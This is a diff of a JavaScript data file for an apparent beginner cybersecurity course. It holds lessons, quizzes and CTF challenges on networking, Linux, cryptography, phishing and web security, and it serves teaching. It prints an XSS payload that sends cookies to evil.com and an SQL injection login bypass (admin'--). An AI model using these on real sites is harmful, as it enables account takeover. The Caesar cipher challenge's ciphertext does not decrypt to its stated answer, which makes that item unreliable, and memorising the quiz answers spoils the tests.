+        ]
+      },
+      {
+        id:'m0l1', title:'Types of Hackers',
+        content:`<div class="lesson-text">
+          <h3>// Hacker Categories</h3>
+          <p>Not all hackers are criminals. In cybersecurity, we categorize hackers by their intentions:</p>
+          <ul>
+            <li><strong style="color:var(--accent)">White Hat</strong> — Ethical hackers who work legally to find and fix vulnerabilities. They always have permission.</li>
+            <li><strong style="color:var(--muted)">Grey Hat</strong> — Hackers who may break rules but without malicious intent. They often report vulnerabilities they find.</li>
+            <li><strong style="color:var(--red)">Black Hat</strong> — Malicious hackers who break into systems illegally for personal gain, theft or destruction.</li>
+            <li><strong style="color:var(--yellow)">Script Kiddie</strong> — Unskilled attackers who use tools made by others without understanding them.</li>
+            <li><strong style="color:var(--purple)">Hacktivist</strong> — Hackers motivated by political or social causes (e.g. Anonymous).</li>
+          </ul>
+          <h3>// Common Roles in Cybersecurity</h3>
+          <ul>
+            <li><strong>Penetration Tester (Pentester)</strong> — Gets paid to hack systems to find weaknesses</li>
+            <li><strong>Security Analyst</strong> — Monitors systems for suspicious activity</li>
+            <li><strong>Incident Responder</strong> — Handles security breaches when they happen</li>
+            <li><strong>Security Engineer</strong> — Builds and maintains secure systems</li>
+            <li><strong>SOC Analyst</strong> — Works in a Security Operations Centre monitoring alerts 24/7</li>
+          </ul>
+          <div class="tip-box">💡 <div>Ethical hacking is a legal and highly paid career. Certified Ethical Hackers (CEH) earn an average of $90,000+ per year.</div></div>
+          <h3>// The Attacker Mindset</h3>
+          <p>To defend systems, you must think like an attacker. This is called the <strong>offensive security mindset</strong>. Understanding how attacks work is essential to preventing them. This is why ethical hackers are so valuable.</p>
+        </div>`,
+        video:'https://www.youtube.com/embed/1I9f_hCqMEI',
+        quiz:[
+          {q:'What type of hacker works legally with permission to find vulnerabilities?',opts:['Black Hat','Grey Hat','White Hat','Script Kiddie'],correct:2,exp:'White Hat hackers are ethical hackers who always have authorization before testing systems.',trick:false},
+          {q:'TRICK: Grey Hat hackers are fully legal because they do not have malicious intent.',opts:['True','False'],correct:1,exp:'FALSE. Grey Hat hackers often break laws even without malicious intent — accessing systems without permission is illegal regardless of intent.',trick:true},
+          {q:'What is a Script Kiddie?',opts:['A young programmer','An expert hacker who writes scripts','An unskilled attacker who uses tools made by others','A type of malware'],correct:2,exp:'Script Kiddies use hacking tools made by others without understanding how they work.',trick:false},
+          {q:'A hacktivist is motivated primarily by:',opts:['Money','Political or social causes','Fame','Curiosity'],correct:1,exp:'Hacktivists are motivated by political or social causes — they hack to promote an agenda.',trick:false},
+          {q:'What does a SOC Analyst do?',opts:['Sells security software','Monitors security alerts 24/7 in a Security Operations Centre','Writes malware to test systems','Manages company HR'],correct:1,exp:'SOC (Security Operations Centre) Analysts monitor alerts and respond to security incidents around the clock.',trick:false},
+          {q:'TRICK: A penetration tester and a black hat hacker use completely different techniques.',opts:['True','False'],correct:1,exp:'FALSE. They often use the same techniques and tools — the key difference is PERMISSION. Pentesters have written authorization.',trick:true},
+          {q:'Which hacker type is most likely to report a vulnerability after finding it without permission?',opts:['Black Hat','White Hat','Grey Hat','Script Kiddie'],correct:2,exp:'Grey Hats often find vulnerabilities without permission but report them rather than exploiting them maliciously.',trick:false},
+          {q:'What is the "offensive security mindset"?',opts:['Attacking competitors','Thinking like an attacker to better defend systems','Ignoring security vulnerabilities','Using only defensive tools'],correct:1,exp:'The offensive security mindset means understanding attack techniques so you can build better defenses.',trick:false},
+          {q:'TRICK: Only Black Hat hackers need to understand how attacks work.',opts:['True','False'],correct:1,exp:'FALSE. Ethical hackers (White Hats) must deeply understand attack techniques to find vulnerabilities before criminals do.',trick:true},
+          {q:'Which role specifically handles security breaches after they happen?',opts:['Penetration Tester','Security Engineer','Incident Responder','SOC Analyst'],correct:2,exp:'Incident Responders are specialists who handle and contain security breaches after they occur.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m1', icon:'🌐', title:'Networking Basics', desc:'Learn how the internet works, TCP/IP, DNS, ports and protocols — the foundation of all network security.',
+    lessons:[
+      {
+        id:'m1l0', title:'How the Internet Works',
+        content:`<div class="lesson-text">
+          <h3>// IP Addresses</h3>
+          <p>Every device on a network has an IP address — like a home address for your computer. There are two types:</p>
+          <ul>
+            <li><strong style="color:var(--accent)">IPv4</strong> — e.g. 192.168.1.1 (32-bit, ~4 billion addresses)</li>
+            <li><strong style="color:var(--accent2)">IPv6</strong> — e.g. 2001:db8::1 (128-bit, virtually unlimited)</li>
+          </ul>
+          <h3>// The OSI Model</h3>
+          <p>The OSI (Open Systems Interconnection) model has 7 layers that describe how data travels across a network:</p>
+          <div class="code-block">Layer 7 — Application  (HTTP, FTP, DNS)
+Layer 6 — Presentation (Encryption, Compression)
+Layer 5 — Session      (Sessions, Authentication)
+Layer 4 — Transport    (TCP, UDP)
+Layer 3 — Network      (IP, Routing)
+Layer 2 — Data Link    (MAC, Ethernet)
+Layer 1 — Physical     (Cables, Wi-Fi)</div>
+          <div class="tip-box">💡 <div>Remember the layers with: <strong>"All People Seem To Need Data Processing"</strong> (Application → Physical, top to bottom)</div></div>
+          <h3>// TCP vs UDP</h3>
+          <ul>
+            <li><strong>TCP</strong> — Reliable, ordered delivery. Used for web, email, file transfer. Slower but guaranteed.</li>
+            <li><strong>UDP</strong> — Fast but unreliable. Used for video streaming, gaming, DNS. No guarantee of delivery.</li>
+          </ul>
+          <h3>// Public vs Private IP</h3>
+          <ul>
+            <li><strong>Private IP</strong> — Used inside your home/office network (e.g. 192.168.x.x)</li>
+            <li><strong>Public IP</strong> — Your address on the internet, assigned by your ISP</li>
+          </ul>
+        </div>`,
+        video:'https://www.youtube.com/embed/x3c1ih2NJEg',
+        quiz:[
+          {q:'How many layers does the OSI model have?',opts:['4','5','6','7'],correct:3,exp:'The OSI model has exactly 7 layers from Physical (Layer 1) to Application (Layer 7).',trick:false},
+          {q:'Which protocol provides reliable, ordered data delivery?',opts:['UDP','HTTP','TCP','DNS'],correct:2,exp:'TCP (Transmission Control Protocol) guarantees reliable, ordered delivery — unlike UDP.',trick:false},
+          {q:'TRICK: UDP is better than TCP for sending important financial data.',opts:['True','False'],correct:1,exp:'FALSE. UDP does not guarantee delivery. TCP should be used for important data that cannot be lost.',trick:true},
+          {q:'What layer of the OSI model does IP routing operate at?',opts:['Layer 1 — Physical','Layer 2 — Data Link','Layer 3 — Network','Layer 4 — Transport'],correct:2,exp:'IP routing operates at Layer 3 (Network). This is where IP addresses are used.',trick:false},
+          {q:'What is 192.168.1.1 an example of?',opts:['A public IP address','A private IPv4 address','An IPv6 address','A MAC address'],correct:1,exp:'192.168.x.x is a private IPv4 address range used inside local networks.',trick:false},
+          {q:'TRICK: DNS operates at the Physical layer (Layer 1) of the OSI model.',opts:['True','False'],correct:1,exp:'FALSE. DNS operates at the Application layer (Layer 7) — the topmost layer.',trick:true},
+          {q:'Which is faster but less reliable — TCP or UDP?',opts:['TCP','UDP','Both are equally fast','Neither'],correct:1,exp:'UDP is faster because it does not wait for acknowledgements or retransmit lost data.',trick:false},
+          {q:'What does ISP stand for?',opts:['Internet Security Protocol','Internet Service Provider','Internal System Port','IP Security Protocol'],correct:1,exp:'ISP stands for Internet Service Provider — the company that gives you internet access.',trick:false},
+          {q:'TRICK: Your home computer has only one IP address.',opts:['True','False'],correct:1,exp:'FALSE. Your computer typically has at least two — a private IP (local network) and a public IP (internet). It may also have multiple network interfaces.',trick:true},
+          {q:'At which OSI layer does encryption typically happen?',opts:['Layer 1','Layer 3','Layer 6','Layer 7'],correct:2,exp:'Encryption and decryption happen at Layer 6 — the Presentation layer.',trick:false},
+        ]
+      },
+      {
+        id:'m1l1', title:'Ports & Protocols',
+        content:`<div class="lesson-text">
+          <h3>// What are Ports?</h3>
+          <p>Ports are like doors on a computer. Each service listens on a specific port number (0–65535). Knowing common ports is essential for network security and penetration testing.</p>
+          <div class="code-block">Port 80   — HTTP  (web traffic, unencrypted)
+Port 443  — HTTPS (web traffic, encrypted)
+Port 22   — SSH   (secure remote login)
+Port 21   — FTP   (file transfer — unencrypted)
+Port 25   — SMTP  (email sending)
+Port 53   — DNS   (domain name lookup)
+Port 3389 — RDP   (Windows remote desktop)
+Port 3306 — MySQL (database)</div>
+          <h3>// DNS — The Internet's Phone Book</h3>
+          <p>DNS (Domain Name System) translates human-readable domain names into IP addresses. When you type "google.com", DNS finds the IP address 142.250.80.46.</p>
+          <div class="warn-box">⚠️ <div><strong>DNS Spoofing</strong> is a common attack where hackers poison the DNS cache to redirect users to fake websites. Always use encrypted DNS (DoH) when possible.</div></div>
+          <h3>// Common Network Attacks</h3>
+          <ul>
+            <li><strong>Port Scanning</strong> — Finding open ports on a target (tool: nmap)</li>
+            <li><strong>ARP Spoofing</strong> — Linking attacker's MAC address to a legitimate IP</li>
+            <li><strong>DNS Spoofing</strong> — Redirecting domain lookups to malicious IPs</li>
+            <li><strong>Man-in-the-Middle (MITM)</strong> — Intercepting traffic between two parties</li>
+          </ul>
+        </div>`,
+        video:'https://www.youtube.com/embed/kCuyS7ihr_E',
+        quiz:[
+          {q:'Which port does HTTPS use?',opts:['80','21','443','22'],correct:2,exp:'HTTPS uses port 443. Port 80 is HTTP — the same but unencrypted.',trick:false},
+          {q:'TRICK: FTP (port 21) is a secure way to transfer files.',opts:['True','False'],correct:1,exp:'FALSE. FTP transmits data including passwords in plain text with no encryption. Use SFTP or FTPS instead.',trick:true},
+          {q:'What port does SSH use for secure remote login?',opts:['80','443','22','3389'],correct:2,exp:'SSH (Secure Shell) uses port 22 for encrypted remote login to servers.',trick:false},
+          {q:'What is DNS Spoofing?',opts:['Changing your DNS server','Poisoning DNS cache to redirect users to malicious sites','Blocking all DNS traffic','Encrypting DNS queries'],correct:1,exp:'DNS Spoofing poisons the DNS cache so domain names resolve to attacker-controlled IPs.',trick:false},
+          {q:'Which tool is commonly used for port scanning?',opts:['Wireshark','Metasploit','nmap','Burp Suite'],correct:2,exp:'nmap (Network Mapper) is the industry standard tool for port scanning and network discovery.',trick:false},
+          {q:'TRICK: Port 3389 (RDP) being open on a server is always safe if you have a strong password.',opts:['True','False'],correct:1,exp:'FALSE. RDP exposed to the internet is a major attack surface. It should be restricted by IP, hidden behind VPN, or disabled if not needed.',trick:true},
+          {q:'What does ARP Spoofing allow an attacker to do?',opts:['Crash a server','Intercept network traffic by linking their MAC to a legitimate IP','Delete DNS records','Scan open ports'],correct:1,exp:'ARP Spoofing tricks the network into sending traffic to the attacker\'s machine — enabling Man-in-the-Middle attacks.',trick:false},
+          {q:'How many total ports are available on a computer?',opts:['1,024','8,080','65,535','100,000'],correct:2,exp:'There are 65,535 ports (0-65535). Ports 0-1023 are "well-known" ports reserved for standard services.',trick:false},
+          {q:'TRICK: HTTP (port 80) and HTTPS (port 443) carry identical levels of security.',opts:['True','False'],correct:1,exp:'FALSE. HTTP is unencrypted — anyone on the network can read the traffic. HTTPS encrypts traffic using TLS.',trick:true},
+          {q:'What is a Man-in-the-Middle (MITM) attack?',opts:['An attack that crashes servers','Intercepting communications between two parties without their knowledge','Installing malware on a device','Brute-forcing a password'],correct:1,exp:'MITM attacks secretly intercept and potentially alter communications between two parties who think they are talking directly to each other.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m2', icon:'🐧', title:'Linux for Security', desc:'Master the Linux command line — the essential tool used by every cybersecurity professional.',
+    lessons:[
+      {
+        id:'m2l0', title:'Linux Basics',
+        content:`<div class="lesson-text">
+          <h3>// Why Linux?</h3>
+          <p>Nearly all cybersecurity tools run on Linux. Kali Linux is the most popular security-focused OS. Understanding Linux is non-negotiable in this field. Most servers on the internet also run Linux.</p>
+          <h3>// Essential Commands</h3>
+          <div class="code-block">ls          — list files in directory
+ls -la      — list ALL files including hidden ones
+cd folder   — change directory
+pwd         — print working directory (where am I?)
+cat file    — display file contents
+grep text file — search for text in file
+chmod 755 file — change file permissions
+sudo command — run as administrator (superuser)
+man command  — view manual for a command
+ps aux      — list ALL running processes
+netstat -an — show all network connections
+whoami      — show current user
+ifconfig    — show network interface info</div>
+          <h3>// File Permissions</h3>
+          <p>Linux uses a permission system: <strong>r</strong> (read=4), <strong>w</strong> (write=2), <strong>x</strong> (execute=1) for owner, group and others.</p>
+          <div class="code-block">-rwxr-xr-- means:
+  owner:  r+w+x = 7 (full access)
+  group:  r+x   = 5 (read and run)
+  others: r     = 4 (read only)
+So chmod 754 sets these exact permissions.</div>
+          <div class="tip-box">💡 <div>Try Linux for free in your browser at <strong>webminal.org</strong> or install <strong>Kali Linux</strong> in a virtual machine using VirtualBox.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/oxuRxtrO2Ag',
+        quiz:[
+          {q:'Which command lists ALL files including hidden ones in Linux?',opts:['ls','ls -la','dir','cat'],correct:1,exp:'"ls -la" lists all files including hidden ones (starting with .) with detailed info. Plain "ls" skips hidden files.',trick:false},
+          {q:'What does "sudo" do?',opts:['Deletes a file','Runs a command as administrator','Lists network connections','Shows file permissions'],correct:1,exp:'"sudo" (superuser do) runs commands with root/administrator privileges.',trick:false},
+          {q:'TRICK: "chmod 777" on a file is a good security practice.',opts:['True','False'],correct:1,exp:'FALSE. chmod 777 gives read, write and execute to EVERYONE — this is extremely insecure. Use the least privilege needed.',trick:true},
+          {q:'What command shows you which user you are logged in as?',opts:['pwd','whoami','ps aux','id'],correct:1,exp:'"whoami" prints the current logged-in username.',trick:false},
+          {q:'In Linux permissions "-rwxr-xr--", what can the GROUP do?',opts:['Read, write, execute','Read and execute only','Read only','Nothing'],correct:1,exp:'The middle three characters "r-x" mean group members can read and execute but NOT write.',trick:false},
+          {q:'TRICK: The "man" command is used to manage user accounts in Linux.',opts:['True','False'],correct:1,exp:'FALSE. "man" displays the manual (help pages) for any command. Use "useradd" or "usermod" for user management.',trick:true},
+          {q:'What does "grep password /etc/shadow" do?',opts:['Creates a new password','Searches for the word "password" in the shadow file','Deletes the shadow file','Encrypts the shadow file'],correct:1,exp:'"grep" searches for text patterns in files. This searches for "password" inside /etc/shadow.',trick:false},
+          {q:'What numeric value does chmod "execute" permission have?',opts:['1','2','4','8'],correct:0,exp:'In Linux permissions: read=4, write=2, execute=1. So rwx = 4+2+1 = 7.',trick:false},
+          {q:'TRICK: "ps aux" only shows processes owned by the current user.',opts:['True','False'],correct:1,exp:'FALSE. "ps aux" shows ALL processes from ALL users on the system. Use "ps" alone to see only your processes.',trick:true},
+          {q:'Which file in Linux stores hashed user passwords?',opts:['/etc/passwd','/etc/shadow','/etc/users','/var/passwords'],correct:1,exp:'/etc/shadow stores the hashed passwords. /etc/passwd used to store them but is now readable by all users.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m3', icon:'🔑', title:'Cryptography', desc:'Understand encryption, hashing, public/private keys and how data is kept secret online.',
+    lessons:[
+      {
+        id:'m3l0', title:'Encryption & Hashing',
+        content:`<div class="lesson-text">
+          <h3>// What is Cryptography?</h3>
+          <p>Cryptography is the science of securing information by transforming it into an unreadable format. It's the foundation of secure communications on the internet — without it, all your passwords, messages and banking details would be visible to anyone.</p>
+          <h3>// Symmetric vs Asymmetric Encryption</h3>
+          <ul>
+            <li><strong style="color:var(--accent)">Symmetric</strong> — Same key used to encrypt and decrypt. Fast but key sharing is a problem. Example: AES-256</li>
+            <li><strong style="color:var(--accent2)">Asymmetric</strong> — Public key encrypts, private key decrypts. Slower but solves key sharing. Example: RSA-2048</li>
+          </ul>
+          <div class="code-block">// How HTTPS works (simplified):
+1. Browser gets server's PUBLIC key (from certificate)
+2. Browser encrypts a random session key with public key
+3. Server decrypts session key with its PRIVATE key
+4. Both now share the session key securely
+5. All traffic encrypted with AES using that session key</div>
+          <h3>// Hashing</h3>
+          <p>A hash function converts any input into a fixed-length string. It's <strong>one-way</strong> — you cannot reverse it. This is why websites store password hashes, not actual passwords.</p>
+          <div class="code-block">MD5("hello")    = 5d41402abc4b2a76b9719d911017c592
+SHA256("hello") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c...
+bcrypt("hello") = $2b$12$... (includes salt — best for passwords)</div>
+          <div class="warn-box">⚠️ <div><strong>MD5 is broken</strong> — collisions have been found (two different inputs producing the same hash). Never use MD5 for security. Use SHA-256 minimum, or bcrypt for passwords.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/AQDCe585Lnc',
+        quiz:[
+          {q:'Which encryption type uses the same key to encrypt and decrypt?',opts:['Asymmetric','Symmetric','Hashing','PKI'],correct:1,exp:'Symmetric encryption uses one shared secret key for both encryption and decryption.',trick:false},
+          {q:'TRICK: Hashing and encryption are the same thing — both can be reversed.',opts:['True','False'],correct:1,exp:'FALSE. Hashing is one-way and cannot be reversed. Encryption is two-way — encrypted data can be decrypted with the right key.',trick:true},
+          {q:'In HTTPS, what is encrypted with the server\'s PUBLIC key?',opts:['The website content','The server\'s private key','A random session key','The user\'s password'],correct:2,exp:'The browser encrypts a random session key with the server\'s public key. Only the server\'s private key can decrypt it.',trick:false},
+          {q:'Why do websites store password hashes instead of actual passwords?',opts:['Hashes are shorter','If the database is stolen, attackers cannot reverse the hash to get passwords','Hashes are faster to compare','Passwords are too long to store'],correct:1,exp:'Hashing is one-way — even if attackers steal the database, they cannot reverse hashes to get the original passwords.',trick:false},
+          {q:'Which is the most secure option for storing user passwords?',opts:['MD5','SHA-1','SHA-256','bcrypt'],correct:3,exp:'bcrypt is specifically designed for password hashing. It includes a salt and is deliberately slow to resist brute-force attacks.',trick:false},
+          {q:'TRICK: RSA (asymmetric) encryption is faster than AES (symmetric) encryption.',opts:['True','False'],correct:1,exp:'FALSE. Asymmetric encryption like RSA is much slower than symmetric encryption like AES. This is why HTTPS uses RSA only to exchange a key, then switches to AES for actual data.',trick:true},
+          {q:'What is a "salt" in password hashing?',opts:['A type of encryption key','A random value added to a password before hashing to prevent rainbow table attacks','A hash algorithm','A type of cipher'],correct:1,exp:'A salt is a random value added to each password before hashing. This ensures two identical passwords produce different hashes.',trick:false},
+          {q:'What is a collision in hashing?',opts:['Two keys encrypting the same data','Two different inputs producing the same hash output','A hash that cannot be computed','A cracked encryption key'],correct:1,exp:'A collision is when two different inputs produce the same hash — this breaks the integrity of the hash function. MD5 is vulnerable to this.',trick:false},
+          {q:'TRICK: If two files have the same SHA-256 hash, they must be identical.',opts:['True — SHA-256 has never had a collision','False — SHA-256 has many known collisions'],correct:0,exp:'TRUE (currently). SHA-256 has no known practical collisions. If two files share the same SHA-256 hash, they are almost certainly identical — this is used for file verification.',trick:true},
+          {q:'Which type of encryption is used for the bulk of HTTPS traffic once the connection is established?',opts:['RSA (asymmetric)','AES (symmetric)','MD5 hashing','bcrypt'],correct:1,exp:'After the initial key exchange using RSA, HTTPS switches to AES symmetric encryption for actual data transfer — because AES is much faster.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m4', icon:'🎭', title:'Social Engineering', desc:'Learn how attackers manipulate people psychologically — often the weakest link in security.',
+    lessons:[
+      {
+        id:'m4l0', title:'Phishing & Human Hacking',
+        content:`<div class="lesson-text">
+          <h3>// The Human Firewall</h3>
+          <p>No matter how secure the technology, humans are often the weakest link. Social engineering exploits human psychology rather than technical vulnerabilities. Even the most secure systems can be compromised through deception.</p>
+          <h3>// Types of Social Engineering</h3>
+          <ul>
+            <li><strong style="color:var(--accent3)">Phishing</strong> — Fake emails that trick you into revealing credentials or clicking malicious links</li>
+            <li><strong style="color:var(--accent3)">Spear Phishing</strong> — Targeted phishing aimed at specific individuals using personal information</li>
+            <li><strong style="color:var(--accent3)">Whaling</strong> — Spear phishing targeting executives (CEOs, CFOs)</li>
+            <li><strong style="color:var(--accent3)">Vishing</strong> — Voice phishing via phone calls</li>
+            <li><strong style="color:var(--accent3)">Smishing</strong> — SMS phishing via text messages</li>
+            <li><strong style="color:var(--accent3)">Pretexting</strong> — Creating a fake scenario (e.g. "I'm from IT support") to extract information</li>
+            <li><strong style="color:var(--accent3)">Baiting</strong> — Leaving infected USB drives for curious victims to find and plug in</li>
+          </ul>
+          <h3>// Red Flags of Phishing Emails</h3>
+          <ul>
+            <li>Urgent language: "Your account will be closed in 24 hours!"</li>
+            <li>Mismatched sender email (support@micros0ft.com — note the zero)</li>
+            <li>Suspicious links — always hover before clicking to see real destination</li>
+            <li>Requests for passwords, PINs or personal info via email</li>
+            <li>Poor spelling and grammar (though AI is making phishing more convincing)</li>
+          </ul>
+          <div class="tip-box">💡 <div>Always verify unexpected requests through a <strong>different</strong> communication channel. If your "bank" emails you, call the official number on the back of your card — don't use any number in the email.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/lc7scxvKQOo',
+        quiz:[
+          {q:'What is whaling in social engineering?',opts:['Phishing using whale images','Spear phishing targeting senior executives like CEOs','A type of network attack','Mass phishing emails sent to millions'],correct:1,exp:'Whaling targets "big fish" — senior executives like CEOs or CFOs — using highly personalized attacks.',trick:false},
+          {q:'TRICK: A well-written email with perfect grammar cannot be a phishing attempt.',opts:['True','False'],correct:1,exp:'FALSE. AI tools have made phishing emails much more convincing. Perfect grammar does NOT guarantee an email is legitimate.',trick:true},
+          {q:'What is pretexting?',opts:['Writing fake text messages','Creating a fabricated scenario to manipulate someone into giving information','Previewing a text before sending','A type of malware'],correct:1,exp:'Pretexting involves creating a believable false scenario (e.g. "I\'m your IT support") to manipulate victims into giving up information.',trick:false},
+          {q:'Someone leaves a USB drive in a company car park labelled "Salaries 2025". This is an example of:',opts:['Vishing','Pretexting','Baiting','Smishing'],correct:2,exp:'Baiting uses curiosity to trick victims into plugging in infected USB drives or clicking tempting links.',trick:false},
+          {q:'TRICK: Spear phishing and regular phishing use identical targeting approaches.',opts:['True','False'],correct:1,exp:'FALSE. Regular phishing sends generic emails to millions hoping some will fall for it. Spear phishing targets specific individuals using researched personal information.',trick:true},
+          {q:'You receive an urgent SMS from "your bank" saying your account is suspended. What should you do?',opts:['Click the link in the SMS immediately','Call the number provided in the SMS','Find your bank\'s official number independently and call that','Reply to the SMS with your account details'],correct:2,exp:'Always verify through an independent channel. Find the bank\'s official number on their website or the back of your card — never use contact details provided in a suspicious message.',trick:false},
+          {q:'What does a phishing email from "support@micros0ft.com" demonstrate?',opts:['A legitimate Microsoft email','Domain spoofing using a zero instead of the letter "o"','A secure Microsoft domain','An internal Microsoft communication'],correct:1,exp:'Attackers use look-alike domains (replacing "o" with "0") to fool victims who don\'t inspect email addresses carefully.',trick:false},
+          {q:'TRICK: Hovering over a link in an email is enough to confirm it is safe to click.',opts:['True','False'],correct:1,exp:'FALSE. Hovering shows you the destination URL, but attackers can use URL shorteners, redirects or typosquatting. Even if it looks right, be cautious with unexpected emails.',trick:true},
+          {q:'Which type of social engineering specifically uses phone calls?',opts:['Smishing','Vishing','Phishing','Pretexting'],correct:1,exp:'Vishing (Voice phishing) uses phone calls — attackers impersonate banks, government agencies or tech support.',trick:false},
+          {q:'What makes spear phishing more dangerous than regular phishing?',opts:['It uses more emails','It targets random people','It uses personal information to appear more convincing and legitimate','It is always automated'],correct:2,exp:'Spear phishing attackers research their targets first, using real names, job titles, colleagues and recent events to make their attacks far more convincing.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m5', icon:'🌍', title:'Web Security', desc:'Learn about OWASP Top 10, SQL injection, XSS, CSRF and how to secure web applications.',
+    lessons:[
+      {
+        id:'m5l0', title:'OWASP Top 10 & Common Attacks',
+        content:`<div class="lesson-text">
+          <h3>// What is OWASP?</h3>
+          <p>The Open Web Application Security Project (OWASP) publishes the Top 10 most critical web application security risks. Every web developer and security professional must know these inside out.</p>
+          <h3>// OWASP Top 10 (2021)</h3>
+          <ul>
+            <li><strong style="color:var(--red)">A01</strong> — Broken Access Control (most common)</li>
+            <li><strong style="color:var(--red)">A02</strong> — Cryptographic Failures</li>
+            <li><strong style="color:var(--red)">A03</strong> — Injection (SQL, NoSQL, Command injection)</li>
+            <li><strong style="color:var(--red)">A04</strong> — Insecure Design</li>
+            <li><strong style="color:var(--red)">A05</strong> — Security Misconfiguration</li>
+            <li><strong style="color:var(--red)">A06</strong> — Vulnerable and Outdated Components</li>
+            <li><strong style="color:var(--red)">A07</strong> — Identification and Authentication Failures</li>
+            <li><strong style="color:var(--red)">A08</strong> — Software and Data Integrity Failures</li>
+            <li><strong style="color:var(--red)">A09</strong> — Security Logging and Monitoring Failures</li>
+            <li><strong style="color:var(--red)">A10</strong> — Server-Side Request Forgery (SSRF)</li>
+          </ul>
+          <h3>// SQL Injection</h3>
+          <div class="code-block">// Vulnerable login query:
+SELECT * FROM users WHERE username='$user' AND password='$pass'
+
+// Attacker enters username: admin'--
+// Query becomes:
+SELECT * FROM users WHERE username='admin'--' AND password='...'
+// The -- comments out the password check! Admin login bypassed.
+
+// Defense: Use parameterized queries / prepared statements</div>
+          <h3>// Cross-Site Scripting (XSS)</h3>
+          <p>XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. It can steal cookies, session tokens or redirect users.</p>
+          <div class="code-block">// XSS payload example:
+&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;
+// If stored in a comment field and not sanitized, this runs for every visitor</div>
+          <div class="warn-box">⚠️ <div>Never trust user input. Always <strong>validate, sanitize and encode</strong> all data from users before using it in your application.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/WtHnT73NaaQ',
+        quiz:[
+          {q:'According to OWASP 2021, what is the #1 most common web vulnerability?',opts:['SQL Injection','Broken Access Control','Cryptographic Failures','Cross-Site Scripting'],correct:1,exp:'Broken Access Control moved to #1 in OWASP 2021 — it means users can act outside their intended permissions.',trick:false},
+          {q:'What does SQL injection exploit?',opts:['Weak passwords','Unsanitized user input in database queries','Unencrypted network traffic','Outdated software'],correct:1,exp:'SQL injection exploits applications that include unsanitized user input directly in SQL queries.',trick:false},
+          {q:'TRICK: Using HTTPS completely prevents SQL injection attacks.',opts:['True','False'],correct:1,exp:'FALSE. HTTPS encrypts traffic between client and server but does nothing to prevent SQL injection — which is a server-side input validation problem.',trick:true},
+          {q:'What is Cross-Site Scripting (XSS)?',opts:['Injecting SQL into a database','Injecting malicious JavaScript into web pages viewed by other users','Intercepting network traffic','Brute forcing passwords'],correct:1,exp:'XSS injects malicious scripts into web pages. When other users view the page, the script executes in their browser.',trick:false},
+          {q:'What is the best defense against SQL injection?',opts:['Using a firewall','Parameterized queries / prepared statements','Encrypting the database','Using HTTPS'],correct:1,exp:'Parameterized queries separate SQL code from user data — the database never treats user input as executable code.',trick:false},
+          {q:'TRICK: Broken Access Control means users cannot access the application at all.',opts:['True','False'],correct:1,exp:'FALSE. Broken Access Control means users CAN access things they should NOT be able to — like viewing another user\'s data or performing admin actions.',trick:true},
+          {q:'An attacker steals your session cookie using XSS. What can they now do?',opts:['Only view your profile','Log into your account without knowing your password','Delete your account permanently','Nothing — cookies are encrypted'],correct:1,exp:'Session cookies authenticate you to websites. If stolen, an attacker can use them to impersonate you and access your account without a password.',trick:false},
+          {q:'What does OWASP A06 (Vulnerable Components) refer to?',opts:['Weak passwords','Using software libraries with known security vulnerabilities','Broken login systems','Poor database design'],correct:1,exp:'A06 covers using outdated or vulnerable third-party libraries and components. Always keep dependencies updated.',trick:false},
+          {q:'TRICK: Validating user input on the client side (browser) is sufficient security.',opts:['True','False'],correct:1,exp:'FALSE. Client-side validation can be bypassed easily using browser developer tools. Always validate on the SERVER side — client-side validation is only for user experience.',trick:true},
+          {q:'What does SSRF (Server-Side Request Forgery) allow an attacker to do?',opts:['Forge email addresses','Make the server send requests to internal systems on the attacker\'s behalf','Steal SSL certificates','Inject SQL into databases'],correct:1,exp:'SSRF tricks the server into making HTTP requests to internal systems (like internal APIs or cloud metadata endpoints) that the attacker cannot directly access.',trick:false},
+        ]
+      }
+    ]
+  }
+];
+
+const CHALLENGES = [
+  {id:'c0', title:'Find the Hidden Flag', diff:'easy', module:'Intro to CyberSec', desc:'Cybersecurity competitions (CTFs) use "flags" — hidden strings you must find. Decode this Base64 string to find the flag:', code:'Q1RGe0Jhc2U2NF9pc19ub3RfZW5jcnlwdGlvbn0=', hint:'Use a Base64 decoder. Try: atob("Q1RGe0...") in your browser console (F12).', answer:'CTF{Base64_is_not_encryption}', xp:50},
+  {id:'c1', title:'What Port is This?', diff:'easy', module:'Networking', desc:'A network scan shows a service running. What common service runs on port 22?', hint:'Think about how you remotely and securely log into a Linux server.', answer:'SSH', xp:30},
+  {id:'c2', title:'Crack the Hash', diff:'medium', module:'Cryptography', desc:'This is an MD5 hash of a common word. What is the original word?\n\n5f4dcc3b5aa765d61d8327deb882cf99', hint:'This is one of the most commonly used (and worst) passwords in the world.', answer:'password', xp:75},
+  {id:'c3', title:'Spot the Phish', diff:'easy', module:'Social Engineering', desc:'Which of these email addresses is most likely a phishing attempt?\n\nA) support@microsoft.com\nB) support@micros0ft.com\nC) noreply@microsoft.com', hint:'Look very carefully at every character in each email address.', answer:'B', xp:40},
+  {id:'c4', title:'SQL Injection Basics', diff:'medium', module:'Web Security', desc:'Complete the SQL injection payload to bypass a login:\n\nUsername: admin\'__\nPassword: anything\n\nWhat two characters should replace the __ to comment out the rest of the query?', hint:'In SQL, these two characters start a comment and ignore everything after them.', answer:'--', xp:80},
+  {id:'c5', title:'Caesar Cipher', diff:'medium', module:'Cryptography', desc:'Decrypt this Caesar cipher (shift of 3):\n\nFEBHULWB', hint:'Caesar cipher shifts each letter back by the shift amount. A=X, B=Y, C=Z with shift 3.', answer:'SECURITY', xp:60},
+];
+
+// ══════════════════════════════════════════════
+// STATE
+// ══════════════════════════════════════════════
+let currentUser = null;
+let userProgress = { xp:0, completedLessons:[], passedQuizzes:[], solvedChallenges:[], level:0 };
+let currentModule = null;
+let currentLessonIdx = 0;
+let currentSection = 'lesson'; // 'lesson' | 'quiz'
